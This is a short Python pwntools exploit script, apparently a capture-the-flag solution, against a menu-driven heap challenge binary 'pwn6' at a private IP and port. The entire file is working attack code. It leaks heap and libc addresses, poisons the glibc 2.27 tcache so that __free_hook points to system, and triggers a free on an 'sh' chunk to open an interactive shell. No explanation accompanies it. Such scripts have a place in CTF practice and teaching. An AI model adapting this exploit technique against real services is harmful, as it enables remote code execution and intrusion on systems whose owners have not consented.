#!/usr/bin/env python
from pwn import *
import time

context.arch = 'amd64'
e , l = ELF('./pwn6') , ELF( 'libc-2.27.so' )

host , port = '10.140.0.8' , 11116
y = remote( host , port )
#y = process( './pwn6' )
#pause()

def add( data ):
    y.sendafter( '>' , '1' )
    y.sendafter( ':' , data )

def pri( idx ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , str( idx ) )

def dle( idx ):
    y.sendafter( '>' , '3' )
    y.sendafter( ':' , str( idx ) )

def magic( idx ):
    y.sendafter( '>' , '7122' )
    y.sendafter( ':' , str( idx ) )


add( p64( 0x91 ) * 16 )
add( 'a' )
add( 'a' )
dle(0)
dle(1)
add( 'b' )
pri( 0 )

print y.recv(6)
heap = u64( y.recv(6) + '\x00\x00' ) - 0x262
success( 'heap -> %s' % hex( heap ) )

magic(0)

add( p64( heap + 0x10 ) )
add( p64( 0 )  )
add( '\x00' * 7 + '\x07' + p64(0)*14 + p64( heap + 0x2f0 ) )

dle(0)

add('b')
pri(0)

y.recv(6)
l.address += u64( y.recv(6) + '\x00\x00' ) - 0x3ebc62
success( 'libc -> %s' % hex( l.address ) )

add( 'a' )

dle(0)
dle(1)

add( p64( l.sym.__free_hook ) )
add( 'sh\x00' )
add( p64( l.sym.system ) )

dle( 1 )

y.interactive()